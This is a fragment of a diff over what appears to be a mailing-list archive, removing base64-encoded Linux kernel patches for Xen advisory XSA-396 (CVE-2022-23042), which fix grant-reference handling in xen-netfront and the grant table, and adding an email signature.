-Z250dGFiX2xpc3RfbG9jaywgZmxhZ3MpOwogCQlpZiAoX2dudHRhYl9lbmRf
-Zm9yZWlnbl9hY2Nlc3NfcmVmKGVudHJ5LT5yZWYsIGVudHJ5LT5ybykpIHsK
-IAkJCXB1dF9mcmVlX2VudHJ5KGVudHJ5LT5yZWYpOwotCQkJaWYgKGVudHJ5
-LT5wYWdlKSB7Ci0JCQkJcHJfZGVidWcoImZyZWVpbmcgZy5lLiAlI3ggKHBm
-biAlI2x4KVxuIiwKLQkJCQkJIGVudHJ5LT5yZWYsIHBhZ2VfdG9fcGZuKGVu
-dHJ5LT5wYWdlKSk7Ci0JCQkJcHV0X3BhZ2UoZW50cnktPnBhZ2UpOwotCQkJ
-fSBlbHNlCi0JCQkJcHJfaW5mbygiZnJlZWluZyBnLmUuICUjeFxuIiwgZW50
-cnktPnJlZik7CisJCQlwcl9kZWJ1ZygiZnJlZWluZyBnLmUuICUjeCAocGZu
-ICUjbHgpXG4iLAorCQkJCSBlbnRyeS0+cmVmLCBwYWdlX3RvX3BmbihlbnRy
-eS0+cGFnZSkpOworCQkJcHV0X3BhZ2UoZW50cnktPnBhZ2UpOwogCQkJa2Zy
-ZWUoZW50cnkpOwogCQkJZW50cnkgPSBOVUxMOwogCQl9IGVsc2UgewpAQCAt
-Mzg5LDkgKzQwMCwxOCBAQCBzdGF0aWMgdm9pZCBnbnR0YWJfaGFuZGxlX2Rl
-ZmVycmVkKHN0cnVjdCB0aW1lcl9saXN0ICp1bnVzZWQpCiBzdGF0aWMgdm9p
-ZCBnbnR0YWJfYWRkX2RlZmVycmVkKGdyYW50X3JlZl90IHJlZiwgYm9vbCBy
-ZWFkb25seSwKIAkJCQlzdHJ1Y3QgcGFnZSAqcGFnZSkKIHsKLQlzdHJ1Y3Qg
-ZGVmZXJyZWRfZW50cnkgKmVudHJ5ID0ga21hbGxvYyhzaXplb2YoKmVudHJ5
-KSwgR0ZQX0FUT01JQyk7CisJc3RydWN0IGRlZmVycmVkX2VudHJ5ICplbnRy
-eTsKKwlnZnBfdCBnZnAgPSAoaW5fYXRvbWljKCkgfHwgaXJxc19kaXNhYmxl
-ZCgpKSA/IEdGUF9BVE9NSUMgOiBHRlBfS0VSTkVMOwogCWNvbnN0IGNoYXIg
-KndoYXQgPSBLRVJOX1dBUk5JTkcgImxlYWtpbmciOwogCisJZW50cnkgPSBr
-bWFsbG9jKHNpemVvZigqZW50cnkpLCBnZnApOworCWlmICghcGFnZSkgewor
-CQl1bnNpZ25lZCBsb25nIGdmbiA9IGdudHRhYl9pbnRlcmZhY2UtPnJlYWRf
-ZnJhbWUocmVmKTsKKworCQlwYWdlID0gcGZuX3RvX3BhZ2UoZ2ZuX3RvX3Bm
-bihnZm4pKTsKKwkJZ2V0X3BhZ2UocGFnZSk7CisJfQorCiAJaWYgKGVudHJ5
-KSB7CiAJCXVuc2lnbmVkIGxvbmcgZmxhZ3M7CiAKQEAgLTE0MDQsNiArMTQy
-NCw3IEBAIHN0YXRpYyBjb25zdCBzdHJ1Y3QgZ250dGFiX29wcyBnbnR0YWJf
-djFfb3BzID0gewogCS51cGRhdGVfZW50cnkJCQk9IGdudHRhYl91cGRhdGVf
-ZW50cnlfdjEsCiAJLmVuZF9mb3JlaWduX2FjY2Vzc19yZWYJCT0gZ250dGFi
-X2VuZF9mb3JlaWduX2FjY2Vzc19yZWZfdjEsCiAJLmVuZF9mb3JlaWduX3Ry
-YW5zZmVyX3JlZgk9IGdudHRhYl9lbmRfZm9yZWlnbl90cmFuc2Zlcl9yZWZf
-djEsCisJLnJlYWRfZnJhbWUJCQk9IGdudHRhYl9yZWFkX2ZyYW1lX3YxLAog
-fTsKIAogc3RhdGljIGNvbnN0IHN0cnVjdCBnbnR0YWJfb3BzIGdudHRhYl92
-Ml9vcHMgPSB7CkBAIC0xNDE1LDYgKzE0MzYsNyBAQCBzdGF0aWMgY29uc3Qg
-c3RydWN0IGdudHRhYl9vcHMgZ250dGFiX3YyX29wcyA9IHsKIAkudXBkYXRl
-X2VudHJ5CQkJPSBnbnR0YWJfdXBkYXRlX2VudHJ5X3YyLAogCS5lbmRfZm9y
-ZWlnbl9hY2Nlc3NfcmVmCQk9IGdudHRhYl9lbmRfZm9yZWlnbl9hY2Nlc3Nf
-cmVmX3YyLAogCS5lbmRfZm9yZWlnbl90cmFuc2Zlcl9yZWYJPSBnbnR0YWJf
-ZW5kX2ZvcmVpZ25fdHJhbnNmZXJfcmVmX3YyLAorCS5yZWFkX2ZyYW1lCQkJ
-PSBnbnR0YWJfcmVhZF9mcmFtZV92MiwKIH07CiAKIHN0YXRpYyBib29sIGdu
-dHRhYl9uZWVkX3YyKHZvaWQpCmRpZmYgLS1naXQgYS9pbmNsdWRlL3hlbi9n
-cmFudF90YWJsZS5oIGIvaW5jbHVkZS94ZW4vZ3JhbnRfdGFibGUuaAppbmRl
-eCBhYjllNjkyYTBlZjQuLmM5ZmVhOTM4OWViZSAxMDA2NDQKLS0tIGEvaW5j
-bHVkZS94ZW4vZ3JhbnRfdGFibGUuaAorKysgYi9pbmNsdWRlL3hlbi9ncmFu
-dF90YWJsZS5oCkBAIC0xMDcsNyArMTA3LDEyIEBAIGludCBnbnR0YWJfZW5k
-X2ZvcmVpZ25fYWNjZXNzX3JlZihncmFudF9yZWZfdCByZWYsIGludCByZWFk
-b25seSk7CiAgKiBOb3RlIHRoYXQgdGhlIGdyYW50ZWQgcGFnZSBtaWdodCBz
-dGlsbCBiZSBhY2Nlc3NlZCAocmVhZCBvciB3cml0ZSkgYnkgdGhlCiAgKiBv
-dGhlciBzaWRlIGFmdGVyIGdudHRhYl9lbmRfZm9yZWlnbl9hY2Nlc3MoKSBy
-ZXR1cm5zLCBzbyBldmVuIGlmIHBhZ2Ugd2FzCiAgKiBzcGVjaWZpZWQgYXMg
-MCBpdCBpcyBub3QgYWxsb3dlZCB0byBqdXN0IHJldXNlIHRoZSBwYWdlIGZv
-ciBvdGhlcgotICogcHVycG9zZXMgaW1tZWRpYXRlbHkuCisgKiBwdXJwb3Nl
-cyBpbW1lZGlhdGVseS4gZ250dGFiX2VuZF9mb3JlaWduX2FjY2VzcygpIHdp
-bGwgdGFrZSBhbiBhZGRpdGlvbmFsCisgKiByZWZlcmVuY2UgdG8gdGhlIGdy
-YW50ZWQgcGFnZSBpbiB0aGlzIGNhc2UsIHdoaWNoIGlzIGRyb3BwZWQgb25s
-eSBhZnRlcgorICogdGhlIGdyYW50IGlzIG5vIGxvbmdlciBpbiB1c2UuCisg
-KiBUaGlzIHJlcXVpcmVzIHRoYXQgbXVsdGkgcGFnZSBhbGxvY2F0aW9ucyBm
-b3IgYXJlYXMgc3ViamVjdCB0bworICogZ250dGFiX2VuZF9mb3JlaWduX2Fj
-Y2VzcygpIGFyZSBkb25lIHZpYSBhbGxvY19wYWdlc19leGFjdCgpIChhbmQg
-ZnJlZWluZworICogdmlhIGZyZWVfcGFnZXNfZXhhY3QoKSkgaW4gb3JkZXIg
-dG8gYXZvaWQgaGlnaCBvcmRlciBwYWdlcy4KICAqLwogdm9pZCBnbnR0YWJf
-ZW5kX2ZvcmVpZ25fYWNjZXNzKGdyYW50X3JlZl90IHJlZiwgaW50IHJlYWRv
-bmx5LAogCQkJICAgICAgIHVuc2lnbmVkIGxvbmcgcGFnZSk7Ci0tIAoyLjM0
-LjEKCg==
-
---=separator
-Content-Type: application/octet-stream; name="xsa396-linux-12.patch"
-Content-Disposition: attachment; filename="xsa396-linux-12.patch"
-Content-Transfer-Encoding: base64
-
-RnJvbSAyMWE1ZDI5YjgyYmU1MjFlYjlmZTRhMzAyMjYyYzhjNzhhNjYzMTIy
-IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBKdWVyZ2VuIEdyb3Nz
-IDxqZ3Jvc3NAc3VzZS5jb20+CkRhdGU6IEZyaSwgMjUgRmViIDIwMjIgMTY6
-MDU6NDMgKzAxMDAKU3ViamVjdDogW1BBVENIIDEyLzEyXSB4ZW4vbmV0ZnJv
-bnQ6IHJlYWN0IHByb3Blcmx5IHRvIGZhaWxpbmcKIGdudHRhYl9lbmRfZm9y
-ZWlnbl9hY2Nlc3NfcmVmKCkKCldoZW4gY2FsbGluZyBnbnR0YWJfZW5kX2Zv
-cmVpZ25fYWNjZXNzX3JlZigpIHRoZSByZXR1cm5lZCB2YWx1ZSBtdXN0CmJl
-IHRlc3RlZCBhbmQgdGhlIHJlYWN0aW9uIHRvIHRoYXQgdmFsdWUgc2hvdWxk
-IGJlIGFwcHJvcHJpYXRlLgoKSW4gY2FzZSBvZiBmYWlsdXJlIGluIHhlbm5l
-dF9nZXRfcmVzcG9uc2VzKCkgdGhlIHJlYWN0aW9uIHNob3VsZCBub3QgYmUK
-dG8gY3Jhc2ggdGhlIHN5c3RlbSwgYnV0IHRvIGRpc2FibGUgdGhlIG5ldHdv
-cmsgZGV2aWNlLgoKVGhlIGNhbGxzIGluIHNldHVwX25ldGZyb250KCkgY2Fu
-IGJlIHJlcGxhY2VkIGJ5IGNhbGxzIG9mCmdudHRhYl9lbmRfZm9yZWlnbl9h
-Y2Nlc3MoKS4gV2hpbGUgYXQgaXQgYXZvaWQgZG91YmxlIGZyZWUgb2Ygcmlu
-ZwpwYWdlcyBhbmQgZ3JhbnQgcmVmZXJlbmNlcyB2aWEgeGVubmV0X2Rpc2Nv
-bm5lY3RfYmFja2VuZCgpIGluIHRoaXMgY2FzZS4KClRoaXMgaXMgQ1ZFLTIw
-MjItMjMwNDIgLyBwYXJ0IG9mIFhTQS0zOTYuCgpSZXBvcnRlZC1ieTogRGVt
-aSBNYXJpZSBPYmVub3VyIDxkZW1pQGludmlzaWJsZXRoaW5nc2xhYi5jb20+
-ClNpZ25lZC1vZmYtYnk6IEp1ZXJnZW4gR3Jvc3MgPGpncm9zc0BzdXNlLmNv
-bT4KUmV2aWV3ZWQtYnk6IEphbiBCZXVsaWNoIDxqYmV1bGljaEBzdXNlLmNv
-bT4KLS0tCiBkcml2ZXJzL25ldC94ZW4tbmV0ZnJvbnQuYyB8IDQ4ICsrKysr
-KysrKysrKysrKysrKysrKysrKy0tLS0tLS0tLS0tLS0tCiAxIGZpbGUgY2hh
-bmdlZCwgMzEgaW5zZXJ0aW9ucygrKSwgMTcgZGVsZXRpb25zKC0pCgpkaWZm
-IC0tZ2l0IGEvZHJpdmVycy9uZXQveGVuLW5ldGZyb250LmMgYi9kcml2ZXJz
-L25ldC94ZW4tbmV0ZnJvbnQuYwppbmRleCA3MjdjMDJlYmQxMmYuLjAwNWRh
-OWRmOTIzZCAxMDA2NDQKLS0tIGEvZHJpdmVycy9uZXQveGVuLW5ldGZyb250
-LmMKKysrIGIvZHJpdmVycy9uZXQveGVuLW5ldGZyb250LmMKQEAgLTk2Niw3
-ICs5NjYsNiBAQCBzdGF0aWMgaW50IHhlbm5ldF9nZXRfcmVzcG9uc2VzKHN0
-cnVjdCBuZXRmcm9udF9xdWV1ZSAqcXVldWUsCiAJc3RydWN0IGRldmljZSAq
-ZGV2ID0gJnF1ZXVlLT5pbmZvLT5uZXRkZXYtPmRldjsKIAlzdHJ1Y3QgYnBm
-X3Byb2cgKnhkcF9wcm9nOwogCXN0cnVjdCB4ZHBfYnVmZiB4ZHA7Ci0JdW5z
-aWduZWQgbG9uZyByZXQ7CiAJaW50IHNsb3RzID0gMTsKIAlpbnQgZXJyID0g
-MDsKIAl1MzIgdmVyZGljdDsKQEAgLTEwMDgsOCArMTAwNywxMyBAQCBzdGF0
-aWMgaW50IHhlbm5ldF9nZXRfcmVzcG9uc2VzKHN0cnVjdCBuZXRmcm9udF9x
-dWV1ZSAqcXVldWUsCiAJCQlnb3RvIG5leHQ7CiAJCX0KIAotCQlyZXQgPSBn
-bnR0YWJfZW5kX2ZvcmVpZ25fYWNjZXNzX3JlZihyZWYsIDApOwotCQlCVUdf
-T04oIXJldCk7CisJCWlmICghZ250dGFiX2VuZF9mb3JlaWduX2FjY2Vzc19y
-ZWYocmVmLCAwKSkgeworCQkJZGV2X2FsZXJ0KGRldiwKKwkJCQkgICJHcmFu
-dCBzdGlsbCBpbiB1c2UgYnkgYmFja2VuZCBkb21haW5cbiIpOworCQkJcXVl
-dWUtPmluZm8tPmJyb2tlbiA9IHRydWU7CisJCQlkZXZfYWxlcnQoZGV2LCAi
-RGlzYWJsZWQgZm9yIGZ1cnRoZXIgdXNlXG4iKTsKKwkJCXJldHVybiAtRUlO
-VkFMOworCQl9CiAKIAkJZ250dGFiX3JlbGVhc2VfZ3JhbnRfcmVmZXJlbmNl
-KCZxdWV1ZS0+Z3JlZl9yeF9oZWFkLCByZWYpOwogCkBAIC0xMjMwLDYgKzEy
-MzQsMTAgQEAgc3RhdGljIGludCB4ZW5uZXRfcG9sbChzdHJ1Y3QgbmFwaV9z
-dHJ1Y3QgKm5hcGksIGludCBidWRnZXQpCiAJCQkJCSAgICZuZWVkX3hkcF9m
-bHVzaCk7CiAKIAkJaWYgKHVubGlrZWx5KGVycikpIHsKKwkJCWlmIChxdWV1
-ZS0+aW5mby0+YnJva2VuKSB7CisJCQkJc3Bpbl91bmxvY2soJnF1ZXVlLT5y
-eF9sb2NrKTsKKwkJCQlyZXR1cm4gMDsKKwkJCX0KIGVycjoKIAkJCXdoaWxl
-ICgoc2tiID0gX19za2JfZGVxdWV1ZSgmdG1wcSkpKQogCQkJCV9fc2tiX3F1
-ZXVlX3RhaWwoJmVycnEsIHNrYik7CkBAIC0xODkzLDcgKzE5MDEsNyBAQCBz
-dGF0aWMgaW50IHNldHVwX25ldGZyb250KHN0cnVjdCB4ZW5idXNfZGV2aWNl
-ICpkZXYsCiAJCQlzdHJ1Y3QgbmV0ZnJvbnRfcXVldWUgKnF1ZXVlLCB1bnNp
-Z25lZCBpbnQgZmVhdHVyZV9zcGxpdF9ldnRjaG4pCiB7CiAJc3RydWN0IHhl
-bl9uZXRpZl90eF9zcmluZyAqdHhzOwotCXN0cnVjdCB4ZW5fbmV0aWZfcnhf
-c3JpbmcgKnJ4czsKKwlzdHJ1Y3QgeGVuX25ldGlmX3J4X3NyaW5nICpyeHMg
-PSBOVUxMOwogCWdyYW50X3JlZl90IGdyZWY7CiAJaW50IGVycjsKIApAQCAt
-MTkxMywyMSArMTkyMSwyMSBAQCBzdGF0aWMgaW50IHNldHVwX25ldGZyb250
-KHN0cnVjdCB4ZW5idXNfZGV2aWNlICpkZXYsCiAKIAllcnIgPSB4ZW5idXNf
-Z3JhbnRfcmluZyhkZXYsIHR4cywgMSwgJmdyZWYpOwogCWlmIChlcnIgPCAw
-KQotCQlnb3RvIGdyYW50X3R4X3JpbmdfZmFpbDsKKwkJZ290byBmYWlsOwog
-CXF1ZXVlLT50eF9yaW5nX3JlZiA9IGdyZWY7CiAKIAlyeHMgPSAoc3RydWN0
-IHhlbl9uZXRpZl9yeF9zcmluZyAqKWdldF96ZXJvZWRfcGFnZShHRlBfTk9J
-TyB8IF9fR0ZQX0hJR0gpOwogCWlmICghcnhzKSB7CiAJCWVyciA9IC1FTk9N
-RU07CiAJCXhlbmJ1c19kZXZfZmF0YWwoZGV2LCBlcnIsICJhbGxvY2F0aW5n
-IHJ4IHJpbmcgcGFnZSIpOwotCQlnb3RvIGFsbG9jX3J4X3JpbmdfZmFpbDsK
-KwkJZ290byBmYWlsOwogCX0KIAlTSEFSRURfUklOR19JTklUKHJ4cyk7CiAJ
-RlJPTlRfUklOR19JTklUKCZxdWV1ZS0+cngsIHJ4cywgWEVOX1BBR0VfU0la
-RSk7CiAKIAllcnIgPSB4ZW5idXNfZ3JhbnRfcmluZyhkZXYsIHJ4cywgMSwg
-JmdyZWYpOwogCWlmIChlcnIgPCAwKQotCQlnb3RvIGdyYW50X3J4X3Jpbmdf
-ZmFpbDsKKwkJZ290byBmYWlsOwogCXF1ZXVlLT5yeF9yaW5nX3JlZiA9IGdy
-ZWY7CiAKIAlpZiAoZmVhdHVyZV9zcGxpdF9ldnRjaG4pCkBAIC0xOTQwLDIy
-ICsxOTQ4LDI4IEBAIHN0YXRpYyBpbnQgc2V0dXBfbmV0ZnJvbnQoc3RydWN0
-IHhlbmJ1c19kZXZpY2UgKmRldiwKIAkJZXJyID0gc2V0dXBfbmV0ZnJvbnRf
-c2luZ2xlKHF1ZXVlKTsKIAogCWlmIChlcnIpCi0JCWdvdG8gYWxsb2NfZXZ0
-Y2huX2ZhaWw7CisJCWdvdG8gZmFpbDsKIAogCXJldHVybiAwOwogCiAJLyog
-SWYgd2UgZmFpbCB0byBzZXR1cCBuZXRmcm9udCwgaXQgaXMgc2FmZSB0byBq
-dXN0IHJldm9rZSBhY2Nlc3MgdG8KIAkgKiBncmFudGVkIHBhZ2VzIGJlY2F1
-c2UgYmFja2VuZCBpcyBub3QgYWNjZXNzaW5nIGl0IGF0IHRoaXMgcG9pbnQu
-CiAJICovCi1hbGxvY19ldnRjaG5fZmFpbDoKLQlnbnR0YWJfZW5kX2ZvcmVp
-Z25fYWNjZXNzX3JlZihxdWV1ZS0+cnhfcmluZ19yZWYsIDApOwotZ3JhbnRf
-cnhfcmluZ19mYWlsOgotCWZyZWVfcGFnZSgodW5zaWduZWQgbG9uZylyeHMp
-OwotYWxsb2NfcnhfcmluZ19mYWlsOgotCWdudHRhYl9lbmRfZm9yZWlnbl9h
-Y2Nlc3NfcmVmKHF1ZXVlLT50eF9yaW5nX3JlZiwgMCk7Ci1ncmFudF90eF9y
-aW5nX2ZhaWw6Ci0JZnJlZV9wYWdlKCh1bnNpZ25lZCBsb25nKXR4cyk7Ci1m
-YWlsOgorIGZhaWw6CisJaWYgKHF1ZXVlLT5yeF9yaW5nX3JlZiAhPSBHUkFO
-VF9JTlZBTElEX1JFRikgeworCQlnbnR0YWJfZW5kX2ZvcmVpZ25fYWNjZXNz
-KHF1ZXVlLT5yeF9yaW5nX3JlZiwgMCwKKwkJCQkJICAodW5zaWduZWQgbG9u
-ZylyeHMpOworCQlxdWV1ZS0+cnhfcmluZ19yZWYgPSBHUkFOVF9JTlZBTElE
-X1JFRjsKKwl9IGVsc2UgeworCQlmcmVlX3BhZ2UoKHVuc2lnbmVkIGxvbmcp
-cnhzKTsKKwl9CisJaWYgKHF1ZXVlLT50eF9yaW5nX3JlZiAhPSBHUkFOVF9J
-TlZBTElEX1JFRikgeworCQlnbnR0YWJfZW5kX2ZvcmVpZ25fYWNjZXNzKHF1
-ZXVlLT50eF9yaW5nX3JlZiwgMCwKKwkJCQkJICAodW5zaWduZWQgbG9uZyl0
-eHMpOworCQlxdWV1ZS0+dHhfcmluZ19yZWYgPSBHUkFOVF9JTlZBTElEX1JF
-RjsKKwl9IGVsc2UgeworCQlmcmVlX3BhZ2UoKHVuc2lnbmVkIGxvbmcpdHhz
-KTsKKwl9CiAJcmV0dXJuIGVycjsKIH0KIAotLSAKMi4zNC4xCgo=
-
---=separator--
+-- 
+Ivan Delalande
